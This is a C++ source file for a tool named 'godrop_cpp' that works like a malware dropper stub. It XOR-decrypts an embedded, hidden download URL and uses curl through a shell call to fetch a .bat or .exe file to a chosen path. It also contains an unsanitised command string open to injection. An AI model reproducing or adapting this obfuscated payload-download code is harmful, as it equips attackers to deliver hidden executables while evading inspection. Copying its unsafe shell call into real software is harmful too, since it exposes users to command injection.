#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

const std::string kEncryptionKey = "GoDropEmbedKey2026";
const std::string kEncryptedUrlHex = "__ENC_URL__";

std::vector<unsigned char> DecodeHex(const std::string& hex) {
    std::vector<unsigned char> out;
    out.reserve(hex.size() / 2);

    for (std::size_t i = 0; i + 1 < hex.size(); i += 2) {
        out.push_back(static_cast<unsigned char>(std::stoi(hex.substr(i, 2), nullptr, 16)));
    }

    return out;
}

std::string DecryptEmbeddedUrl() {
    auto cipher = DecodeHex(kEncryptedUrlHex);

    std::string plain;
    plain.resize(cipher.size());
    for (std::size_t i = 0; i < cipher.size(); ++i) {
        plain[i] = static_cast<char>(cipher[i] ^ static_cast<unsigned char>(kEncryptionKey[i % kEncryptionKey.size()]));
    }

    return plain;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: godrop_cpp <out> [bat|exe] [locale]" << std::endl;
        return 1;
    }

    std::string out = argv[1];
    std::string type = argc > 2 ? argv[2] : "bat";
    std::string locale = argc > 3 ? argv[3] : "en";
    std::string url = DecryptEmbeddedUrl();

    if (url.rfind("http://", 0) != 0 && url.rfind("https://", 0) != 0) {
        std::cerr << "Embedded URL must use http or https." << std::endl;
        return 1;
    }

    if (type != "bat" && type != "exe") {
        std::cerr << "Only bat and exe are supported." << std::endl;
        return 1;
    }

    std::string downloading = "Downloading artifact with curl...";
    std::string saved = "Saved";

    if (locale == "es") {
        downloading = "Descargando artefacto con curl...";
        saved = "Guardado";
    } else if (locale == "fr") {
        downloading = "Téléchargement de l'artefact avec curl...";
        saved = "Enregistré";
    }

    std::cout << downloading << std::endl;
    std::string cmd = "curl -L \"" + url + "\" -o \"" + out + "\"";
    int rc = std::system(cmd.c_str());
    if (rc != 0) {
        std::cerr << "Download failed." << std::endl;
        return rc;
    }

    std::cout << saved << ": " << out << std::endl;
    std::cout << "Use platform tools to inspect SHA256 (e.g., certutil/Get-FileHash)." << std::endl;
    return 0;
}
